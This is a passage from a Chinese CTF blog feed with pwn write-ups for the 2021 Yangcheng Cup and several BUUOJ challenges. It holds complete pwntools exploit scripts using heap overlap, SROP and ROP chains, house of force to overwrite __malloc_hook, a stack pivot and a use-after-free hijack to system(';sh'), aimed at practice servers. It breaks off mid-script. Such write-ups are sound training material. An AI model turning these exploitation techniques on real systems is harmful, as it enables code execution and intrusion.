src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200749914.png" alt="image-20210924200749914"></p><p>把flag字符串写到前面我们申请的1堆块上，可以直接用搜索功能，更快点，rop的地址要后面申请出写的堆块再回来算的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924202223468.png" alt="image-20210924202223468"></p><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924211125389.png" alt="image-20210924211125389"></p><p>借着前面的堆块重叠，往free_hook里面写setcontext+53就行，然后就是最后的堆上布置rop链，堆块给的够大，那就直接选择最大的堆块进行布置，因为要先申请一个0x20的堆块，剩下的大小不够0x100，所以堆块的位置是在最下方的，然后在上面布置好rop，最后就是在setcontext的gadget指向的相应位置写好，跳转执行就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924220626687.png" alt="image-20210924220626687"></p><p>成功读取flag！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./name&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;name size:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛，我能做的应该是有三题的，可能还是太菜了，比赛时就是没出，最终只做了个签到题，还好手快抢了一血，长路漫漫，继续加油吧！&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="羊城杯" scheme="http://example.com/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>buu08</title>
    <link href="http://example.com/2021/09/05/2021-09-05-buu08/"/>
    <id>http://example.com/2021/09/05/2021-09-05-buu08/</id>
    <published>2021-09-05T07:59:06.000Z</published>
    <updated>2021-10-13T08:01:23.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、pwnable-simple-login"><a href="#一、pwnable-simple-login" class="headerlink" title="一、pwnable_simple_login"></a>一、pwnable_simple_login</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105207938.png" alt="image-20210910105207938"></p><p>常规checksec，开了NX、Canary。但是到IDA里面发现，没看到Canary的踪迹</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105257032.png" alt="image-20210910105257032"></p><p>IDA里面有后门函数</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105318680.png" alt="image-20210910105318680"></p><p>base64解码函数里面有些复杂，看的很难受，但是我们可以通过程序逻辑进行判断，返回的应该是长度，因为底下进行了比大小；而s是我们输入的值没什么好说，就是要输入一个base64的值让他再解码成正常值；v5则应该是解码后的值，因为底下把v5的值写入了input里面。但是如果是要以程序逻辑执行到后门函数的话，我也不知道行不行，反正我是不会的。想的肯定是有没有哪里有溢出，跳到后门函数就行了。</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105421986.png" alt="image-20210910105421986"></p><p>找了找，在auth函数里面，memcpy可以溢出了，因为size最大可以为12，而v4距离返回值偏移也为12，似乎不够，只能覆盖到ebp，不过可以发现，在这个函数里面执行一次leave ret，然后这个函数退出了，到main函数，刚好又将会继续执行leave ret。所以其实就是一种栈迁移，把栈迁移到.bss上去，然后执行后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25575</span>)<br>shell = <span class="hljs-number">0x08049284</span><br>input_addr = <span class="hljs-number">0x0811EB40</span><br>p.recvuntil(<span class="hljs-string">&quot;Authenticate : &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(shell) + p32(input_addr)<br>p.sendline(payload.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="二、gyctf-2020-force"><a href="#二、gyctf-2020-force" class="headerlink" title="二、gyctf_2020_force"></a>二、gyctf_2020_force</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916151101226.png" alt="image-20210916151101226"></p><p>常规checksec一下，64位保护全开</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153042695.png" alt="image-20210916153042695"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153101689.png" alt="image-20210916153101689"></p><p>进入IDA，总共就两个功能：一个是申请堆块，堆块大小无限制，并且能返回给堆地址，然后填入内容是固定长度0x50；另外一个puts功能。。。屁用没有！根据题目提示想到house of force</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163309864.png" alt="image-20210916163309864"></p><p>因为程序会返回堆的地址，程序又不限制堆块的大小，所以我们可以申请一个大于top chunk的堆块，那么程序就会调用mmap进行分配堆块，此时堆块的地址会是libc中的一个地址</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163532720.png" alt="image-20210916163532720"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205725583.png" alt="image-20210916205725583"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205619022.png" alt="image-20210916205619022"></p><p>然后申请一个小于0x50的堆块，让堆块能进行溢出覆盖top chunk的size位，修改为-1（也就是0xFFFFFFFFFFFFFFFF），同时也借着这个堆块能获取到top chunk的地址。修改完-1，因为使用malloc申请堆块时验证size的类型是无符号数，所以我们可以分配很大的堆块也仍然可以通过验证，借此直接申请一个超大堆块，直接占满top chunk与__malloc_hook之间长度，然后再申请一个堆块去修改hook的为one_gadget即可</p><p>然后呢。offse至少t减0x30，因为我们申请的堆块是有堆头，并且是要覆盖两个hook</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201004797.png" alt="image-20210916201004797"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201128484.png" alt="image-20210916201128484"></p><p>最后的调整我有些理解不了，明明指向不是0，但最后却能getshell，只能说明应该是在最后执行完malloc后，rsp又被调整了吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="三、pwnable-hacknote"><a href="#三、pwnable-hacknote" class="headerlink" title="三、pwnable_hacknote"></a>三、pwnable_hacknote</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153219237.png" alt="image-20210923153219237"></p><p>常规checksec，32位，没开全RELRO，PIE。猜测可以劫持got表</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153712466.png" alt="image-20210923153712466"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153919700.png" alt="image-20210923153919700"></p><p>在申请堆块功能里，发现一个有意思的东西，把一个调用puts的函数的地址赋值给了堆块内容，猜测打印功能就是直接使用这个函数指针，那么就可以试着修改这个指针，改为system，再把堆块内容修改为/bin/sh</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153939335.png" alt="image-20210923153939335"></p><p>果然，直接调用了函数指针</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153908205.png" alt="image-20210923153908205"></p><p>释放功能，指针没有置零，存在UAF</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193256099.png" alt="image-20210923193256099"></p><p>第一步是获取libc，我的做法是借着释放unsorted chunk产生libc，然后再申请回来，覆盖fd指针为aaaa作为定位，然后将bk指针打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;;sh\x00&quot;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1B37B0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193522763.png" alt="image-20210923193522763"></p><p>然后就是修改函数指针，把函数指针改成指向system的，通过连续释放两个堆块，然后再申请回来（大小是0x8的），那么就会有一个堆块是之前可以调用show功能的堆块，修改这个堆块的内容为system地址，以及”;sh\x00”（或是”||sh”），因为上图传入的参数其实是函数指针的地址，所以要用<code>；</code>或者<code>||</code>才能也执行到sh而获取到shell，然后借着UAF执行show功能getshell</p><p>最后，我换了网上的做法，我前面使用unsorted chunk泄露libc可能远程有点不同，导致没能打通，只有本地通了</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210924081921009.png" alt="image-20210924081921009"></p><p>然后我去实验了一下，发现远程的地址比本地的多了0x300，我打了五六次都是差0x300，之前做buu的堆题获取libc的方式，我已经记不清了，因为buu上的libc是被动过的libc，所以我本地打的时候加载的并不是和buu一模一样的libc，可能这就是因为小版本之间的差异吧，不过根据这次来看，版本之间的小差异，对算libc偏移造成的影响应该是比较小的，前后多试几个0xn00，说不定能行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26554</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span 